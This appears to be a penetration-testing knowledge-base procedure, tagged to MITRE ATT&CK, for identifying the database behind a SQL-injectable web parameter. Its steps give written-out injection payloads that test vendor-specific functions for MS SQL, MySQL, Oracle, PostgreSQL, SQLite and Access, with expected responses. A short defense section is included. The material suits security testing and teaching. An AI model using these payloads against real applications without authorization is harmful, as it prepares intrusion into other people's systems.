---
type: procedure
description: >-
  Identify the underlying database management system (DBMS) through SQL
  injection by testing DBMS-specific functions and observing responses or
  errors.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - dbms-fingerprinting
  - sql-injection
  - database
commands:
  - '[[commands/mssql-binary-checksum-test]]'
  - '[[commands/mysql-crc32-test]]'
  - '[[commands/mysql-connection-id-test]]'
  - '[[commands/mssql-connections-greater-than-zero-test]]'
  - '[[commands/mssql-connections-equality-test]]'
  - '[[commands/mssql-cpu-busy-test]]'
  - '[[commands/sybase-user-id-test]]'
  - '[[commands/oracle-rownum-test]]'
  - '[[commands/oracle-rawtohex-test]]'
  - '[[commands/oracle-lnnvl-test]]'
  - '[[commands/postgresql-integer-cast-test]]'
  - '[[commands/postgresql-client-encoding-test]]'
  - '[[commands/postgresql-ts-config-test]]'
  - '[[commands/postgresql-quote-literal-test]]'
  - '[[commands/postgresql-current-database-test]]'
  - '[[commands/sqlite-version-test]]'
  - '[[commands/sqlite-last-insert-rowid-greater-test]]'
  - '[[commands/sqlite-last-insert-rowid-equality-test]]'
  - '[[commands/access-cdbl-test]]'
  - '[[commands/generic-numeric-equality-test]]'
  - '[[commands/generic-string-equality-test]]'
platforms:
  - Web
  - Database
tools: []
validated: true
---

# DBMS-Fingerprinting-via-SQL-Injection

## Summary

This procedure fingerprints the type of database management system (DBMS) behind a web application vulnerable to SQL injection by injecting tautological SQL expressions that leverage DBMS-specific functions. By observing whether the injection succeeds (e.g., returns a 'true' response in blind SQLi) or produces a characteristic error, the attacker can identify the DBMS, such as MySQL, PostgreSQL, Oracle, MS SQL, SQLite, or others. This enables tailoring subsequent SQL injection exploits to the specific DBMS vulnerabilities.

## Description

In a SQL injection attack, the underlying DBMS is often unknown initially. This procedure uses a series of harmless, always-true SQL conditions that invoke unique functions or syntax from different DBMS vendors. These are injected into a vulnerable parameter (e.g., in a login form or search field) within a boolean-based or error-based SQLi context. Success (normal page load or expected behavior) indicates the function exists, fingerprinting the DBMS. Errors reveal vendor-specific messages (e.g., 'ORA-' for Oracle). This is typically performed manually via tools like Burp Suite or curl, or automated with sqlmap's DBMS detection features. The target environment is a web application with an injectable SQL endpoint, often during reconnaissance in penetration testing or red teaming.

## Requirements

1. A confirmed SQL injection vulnerability in a web application parameter (e.g., via single quote error or boolean tests).
2. Access to intercept and modify HTTP requests (e.g., via proxy like Burp Suite).
3. Basic knowledge of SQL syntax and DBMS differences.
4. Network access to the target web application.

## Defense

- Implement prepared statements and parameterized queries to prevent SQL injection entirely.
- Use web application firewalls (WAFs) to detect and block anomalous SQL payloads.
- Enable DBMS error logging and suppress detailed error messages from reaching the client.
- Regularly audit application code for injection points and apply input validation/sanitization.

## Objectives

1. Determine the specific DBMS (e.g., MySQL, PostgreSQL) to craft targeted exploits.
2. Confirm SQLi vulnerability type (boolean, error-based) during testing.
3. Gather intelligence for further exploitation, such as version-specific attacks.

## Instructions

### Step 1: Confirm SQL Injection Vulnerability

**Context**: Before fingerprinting, verify the injection point responds differently to true/false conditions. Append a generic tautology to a vulnerable parameter in the URL or POST data, such as `param=' AND 1=1 --` (true) vs. `param=' AND 1=2 --` (false). Observe response differences (e.g., page loads vs. no results).

**Command** ([[commands/generic-numeric-equality-test]]):

In the vulnerable parameter, inject:

```sql
' AND 1337=1337 --
```

> This generic test confirms boolean SQLi. Expected: Normal response (true condition). If it fails, try string variant.

**Command** ([[commands/generic-string-equality-test]]):

```sql
' AND 'i'='i' --
```

> Alternative string-based true condition. Expected: Same as above, confirming injectable point.

### Step 2: Test for Microsoft SQL Server (MS SQL)

**Context**: MS SQL uses system variables like @@CONNECTIONS and functions like BINARY_CHECKSUM. Inject these to check for success without syntax errors.

**Command** ([[commands/mssql-binary-checksum-test]]):

```sql
' AND BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123) --
```

> Tests BINARY_CHECKSUM function. Expected: True response if MS SQL; syntax error otherwise.

**Command** ([[commands/mssql-connections-greater-than-zero-test]]):

```sql
' AND @@CONNECTIONS>0 --
```

> Checks active connections. Expected: True if MS SQL and connections exist.

**Command** ([[commands/mssql-connections-equality-test]]):

```sql
' AND @@CONNECTIONS=@@CONNECTIONS --
```

> Tautology on connections. Expected: True response.

**Command** ([[commands/mssql-cpu-busy-test]]):

```sql
' AND @@CPU_BUSY=@@CPU_BUSY --
```

> Tests CPU variable. Expected: True if MS SQL.

**Command** ([[commands/sybase-user-id-test]]):

```sql
' AND USER_ID(1)=USER_ID(1) --
```

> USER_ID is Sybase/MS SQL. Expected: True if compatible.

### Step 3: Test for MySQL

**Context**: MySQL has functions like CRC32 and connection_id(). These will error on other DBMS.

**Command** ([[commands/mysql-crc32-test]]):

```sql
' AND crc32('MySQL')=crc32('MySQL') --
```

> Tests CRC32. Expected: True if MySQL.

**Command** ([[commands/mysql-connection-id-test]]):

```sql
' AND connection_id()=connection_id() --
```

> Tests connection ID. Expected: True if MySQL.

### Step 4: Test for Oracle

**Context**: Oracle uses ROWNUM and RAWTOHEX, with unique logical functions like LNNVL.

**Command** ([[commands/oracle-rownum-test]]):

```sql
' AND ROWNUM=ROWNUM --
```

> Tests ROWNUM pseudocolumn. Expected: True if Oracle.

**Command** ([[commands/oracle-rawtohex-test]]):

```sql
' AND RAWTOHEX('AB')=RAWTOHEX('AB') --
```

> Tests RAWTOHEX. Expected: True if Oracle.

**Command** ([[commands/oracle-lnnvl-test]]):

```sql
' AND LNNVL(0=123) --
```

> LNNVL returns true for false conditions in Oracle. Expected: Response indicating true (since LNNVL(false)=true).

### Step 5: Test for PostgreSQL

**Context**: PostgreSQL has cast syntax like ::integer and functions like pg_client_encoding.

**Command** ([[commands/postgresql-integer-cast-test]]):

```sql
' AND 5::integer=5 --
```

> Tests type casting. Expected: True if PostgreSQL.

**Command** ([[commands/postgresql-client-encoding-test]]):

```sql
' AND pg_client_encoding()=pg_client_encoding() --
```

> Tests client encoding. Expected: True.

**Command** ([[commands/postgresql-ts-config-test]]):

```sql
' AND get_current_ts_config()=get_current_ts_config() --
```

> Tests text search config. Expected: True.

**Command** ([[commands/postgresql-quote-literal-test]]):

```sql
' AND quote_literal(42.5)=quote_literal(42.5) --
```

> Tests quoting. Expected: True.

**Command** ([[commands/postgresql-current-database-test]]):

```sql
' AND current_database()=current_database() --
```

> Tests database name. Expected: True.

### Step 6: Test for SQLite

**Context**: SQLite has last_insert_rowid() and sqlite_version().

**Command** ([[commands/sqlite-version-test]]):

```sql
' AND sqlite_version()=sqlite_version() --
```

> Tests version function. Expected: True if SQLite.

**Command** ([[commands/sqlite-last-insert-rowid-greater-test]]):

```sql
' AND last_insert_rowid()>1 --
```

> Tests row ID (may vary; use for error check). Expected: Depends on context, but syntax success indicates SQLite.

**Command** ([[commands/sqlite-last-insert-rowid-equality-test]]):

```sql
' AND last_insert_rowid()=last_insert_rowid() --
```

> Tautology on row ID. Expected: True.

### Step 7: Test for Microsoft Access

**Context**: Access uses functions like cdbl for conversion.

**Command** ([[commands/access-cdbl-test]]):

```sql
' AND cdbl(1)=cdbl(1) --
```

> Tests double conversion. Expected: True if Access.

### Step 8: Analyze Responses and Confirm

**Context**: Based on which injections succeed without errors, identify the DBMS. Cross-verify with 2-3 tests per candidate. If errors occur, parse for vendor strings (e.g., 'Microsoft OLE DB' for MS SQL).

> No specific command; review all responses. Success across MS SQL tests confirms MS SQL, etc. If none match, it may be a custom or unknown DBMS.
